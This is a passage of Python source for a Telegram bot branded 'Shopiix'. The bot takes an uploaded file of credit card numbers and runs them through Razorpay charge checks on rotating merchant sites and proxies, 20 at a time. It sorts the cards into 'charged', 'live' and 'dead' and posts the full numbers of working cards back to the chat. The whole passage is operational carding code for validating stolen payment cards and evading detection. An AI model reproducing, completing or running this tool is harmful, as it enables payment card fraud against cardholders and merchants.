            await event.reply("❌ No valid sites. Reconfigure with <code>/rzadd</code>.", parse_mode='html')
            return

        wait_msg = await event.reply("⏳ Reading file...", parse_mode='html')
        fp = await reply_msg.download_media()
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(fp)
        except Exception:
            await wait_msg.edit("❌ Could not read file.", parse_mode='html')
            return

        cards = _extract_cc(content)
        if not cards:
            await wait_msg.edit("❌ No valid cards found in file.", parse_mode='html')
            return
        if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
            cards = cards[:MAX_CARDS]

        total   = len(cards)
        chat_id = event.chat_id
        results = {'charged': [], 'live': [], 'dead': [], 'error': 0, 'start': time.time()}
        _stop   = [False]

        await wait_msg.edit(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"💳 <b>{total}</b> cards — Starting Razorpay Charge...",
            parse_mode='html'
        )
        prog_msg = await event.respond(
            "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
            parse_mode='html'
        )

        stop_key = f"rz_stop_{user_id}_{int(time.time())}".encode()

        async def _stop_handler(e):
            if e.sender_id == user_id and e.data == stop_key:
                _stop[0] = True
                await e.answer("⛔ Stopping...")

        bot.add_event_handler(_stop_handler, events.CallbackQuery())

        async def _update_prog(checked, last_card='', last_resp=''):
            elapsed  = int(time.time() - results['start'])
            h, rem   = divmod(elapsed, 3600)
            m_t, s_t = divmod(rem, 60)
            if last_card:
                num    = last_card.split('|')[0]
                masked = num[:6] + '*' * max(0, len(num)-10) + num[-4:] if len(num) > 10 else num
            else:
                masked = '—'
            resp_short = (last_resp[:26] + '...') if len(last_resp) > 28 else (last_resp or '—')
            buttons = [
                [Button.inline(f"💳  Card  →  {masked}",                         b"noop")],
                [Button.inline(f"📝  Response  →  {resp_short}",                  b"noop")],
                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]",  b"noop")],
                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]",     b"noop")],
                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]",     b"noop")],
                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",         b"noop")],
                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",       b"noop")],
                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",               b"noop")],
                [Button.inline("⛔  Stop", stop_key)],
            ]
            try:
                await bot.edit_message(
                    chat_id, prog_msg.id,
                    "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
                    buttons=buttons, parse_mode='html'
                )
            except Exception:
                pass

        semaphore     = asyncio.Semaphore(20)
        checked_count = [0]

        async def _check_one(card, idx):
            if _stop[0]: return
            async with semaphore:
                if _stop[0]: return
                site  = random.choice(valid_sites)
                info  = _rz_data_cache[site]
                proxy = random.choice(proxies) if proxies else None
                res   = await razorpay_check(card, site, info, proxy_str=proxy)
                st    = res['status']
                msg   = res['message']
                if st == 'Charged': results['charged'].append(res)
                elif st == 'Live':  results['live'].append(res)
                elif st == 'Error': results['error'] += 1
                else:               results['dead'].append(res)
                checked_count[0] += 1
                if checked_count[0] % 5 == 0 or checked_count[0] == total:
                    await _update_prog(checked_count[0], card, msg)

        await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])
        bot.remove_event_handler(_stop_handler)

        elapsed  = int(time.time() - results['start'])
        h, rem   = divmod(elapsed, 3600)
        m_t, s_t = divmod(rem, 60)

        hits_txt = ''
        for r in results['charged'][:5]:
            hits_txt += f"💎 <code>{r['card']}</code>\n"
        for r in results['live'][:10]:
            hits_txt += f"🔥 <code>{r['card']}</code>\n"
        if not hits_txt:
            hits_txt = 'No hits found'

        summary = (
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"⚡  <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫  ·  𝗦𝗖𝗔𝗡  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ⚡\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗧𝗢𝗧𝗔𝗟</b>    ▸  <code>{total}</code>\n"
            f"💎 <b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>  ▸  <code>{len(results['charged'])}</code>\n"
            f"🔥 <b>𝗟𝗜𝗩𝗘</b>     ▸  <code>{len(results['live'])}</code>\n"
            f"❌ <b>𝗗𝗘𝗔𝗗</b>     ▸  <code>{len(results['dead'])}</code>\n"
            f"⚠️ <b>𝗘𝗥𝗥𝗢𝗥𝗦</b>   ▸  <code>{results['error']}</code>\n"
            f"🌐 <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬</b>  ▸  Razorpay Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>    ▸  {h}h {m_t}m {s_t}s\n\n"
            f"〔 🎯  H I T S 〕\n<blockquote>{hits_txt}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
        )
        try:
            await bot.edit_message(chat_id, prog_msg.id, summary, parse_mode='html')
        except Exception:
            await event.respond(summary, parse_mode='html')
